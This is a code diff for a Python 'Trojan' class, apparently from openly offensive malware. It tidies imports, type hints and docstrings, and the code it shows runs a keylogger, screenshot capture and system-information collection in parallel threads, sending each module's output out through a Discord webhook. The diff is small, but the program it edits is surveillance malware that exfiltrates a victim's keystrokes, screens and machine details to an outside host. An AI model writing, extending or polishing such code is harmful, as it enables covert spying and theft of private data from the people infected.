@@ -8,8 +8,7 @@ import platform
 from concurrent.futures import ThreadPoolExecutor
 from uuid import uuid4
 
-from src.modules.exfiltration import Discord
-from src.modules.exploitation import KeyLogger, ScreenShot, SystemInformation
+from src.modules import Discord, KeyLogger, ScreenShot, SystemInformation
 
 
 class Trojan:
@@ -28,6 +27,8 @@ class Trojan:
 
     @property
     def screenshot_path(self) -> str:
+        """Gets a platform-dependent absolute path for the screenshot
+        file."""
         filename = f"{str(uuid4())}.jpeg"
         if platform.system() == "Windows":
             app_data = os.path.expandvars(r"%LOCALAPPDATA%")
@@ -37,7 +38,8 @@ class Trojan:
         return path
 
     @property
-    def modules(self) -> set:
+    def modules(self) -> set[KeyLogger, ScreenShot, SystemInformation]:
+        """Gets a set of module instances ready for execution."""
         return {
             KeyLogger(exfil_time=self.exfil_time),
             ScreenShot(exfil_time=self.exfil_time,
@@ -45,7 +47,7 @@ class Trojan:
             SystemInformation()
         }
 
-    def execute(self):
+    def execute(self) -> None:
         with ThreadPoolExecutor() as executor:
             for module in self.modules:
                 Discord(module=module, webhook_url=self.webhook)
